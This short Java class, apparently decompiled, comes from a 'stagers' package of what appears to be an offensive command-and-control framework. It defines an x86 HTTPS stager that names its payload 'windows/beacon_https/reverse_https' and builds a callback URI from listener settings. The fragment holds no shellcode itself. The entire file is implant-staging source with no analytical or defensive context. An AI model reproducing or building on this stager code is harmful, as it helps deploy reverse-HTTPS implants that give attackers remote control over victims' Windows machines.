package stagers;

import common.ScListener;

public class BeaconHTTPSStagerX86 extends GenericHTTPSStagerX86 {
   public BeaconHTTPSStagerX86(ScListener var1) {
      super(var1);
   }

   public String payload() {
      return "windows/beacon_https/reverse_https";
   }

   public String getURI() {
      String var10000 = this.getConfig().getURI();
      return var10000 + this.getConfig().getQueryString();
   }
}
